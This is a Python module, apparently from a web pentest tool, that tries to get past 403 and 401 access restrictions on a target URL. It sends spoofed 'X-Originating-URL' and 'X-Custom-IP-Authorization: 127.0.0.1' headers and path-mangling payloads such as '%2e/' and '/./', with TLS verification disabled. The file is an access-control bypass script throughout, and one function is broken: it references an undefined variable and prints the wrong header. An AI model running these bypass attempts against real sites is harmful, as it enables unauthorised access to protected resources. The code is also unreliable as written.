import requests
import traceback
from config import PLUS, WARNING, INFO, BYP

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def original_url(res, page):
	header = {
	"X-Originating-URL": page
	}
	req = requests.get(res, verify=False, headers=header)
	if req.status_code not in [403, 401, 404, 429, 301, 302, 400, 408, 503]:
		print("{}[{}] Forbidden Bypass with: 'X-Originating-URL: {}'".format(BYP, req.status_code, page))


def IP_authorization(res):
	header = {
	"X-Custom-IP-Authorization": "127.0.0.1"
	}
	req = requests.get(res, verify=False, headers=header)
	if req.status_code not in [403, 401, 404, 429, 301, 302, 400, 408, 503]:
		print("{}[{}] Forbidden Bypass with: 'X-Originating-URL: {}'".format(BYP, req.status_code, page))


def other_bypass(url, page):
	payl = [page+"/.", "/"+page+"/", "./"+page+"/./", "%2e/"+page]
	for p in payl:
		url_b = url + p
		req = requests.get(url_b, verify=False)
		if req.status_code not in [403, 401, 404, 429, 301, 302, 400, 408, 503]:
			print("{}[{}] Forbidden Bypass with: {}".format(BYP, req.status_code, url_b))


def bypass_forbidden(res):
	res_page = res.split("/")[3:]
	url_split = res.split("/")[:3]
	url = "/".join(url_split) + "/"
	page = "/".join(res_page) if len(res_page) > 1 else "".join(res_page)
	req = requests.get(res, verify=False)
	req_url = requests.get(url, verify=False)
	if len(req.content) in range(len(req_url.content) - 50, len(req_url.content) + 50):
		pass
	else:
		original_url(res, page)
		IP_authorization(res)
		other_bypass(url, page)


"""if __name__ == '__main__':
	res = ""
	bypass_forbidden(res)"""